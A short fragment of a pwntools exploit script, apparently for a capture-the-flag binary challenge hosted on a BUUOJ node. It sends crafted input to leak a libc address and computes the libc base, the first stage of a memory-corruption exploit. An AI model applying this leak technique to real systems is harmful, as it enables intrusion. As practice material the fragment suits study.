...
elf = ELF(binary)
p = remote('node4.buuoj.cn',26931) if argv[1]=='r' else process(binary)
...
#leak
sa(b'What\'s your name?',b'name')
sa(b'Please input your ID.',b'a'*8)
ru(b'a'*8)
libc_base = uu64(ru(b'\x7f',drop=False)[-6:])-231-libc.sym['setbuffer']
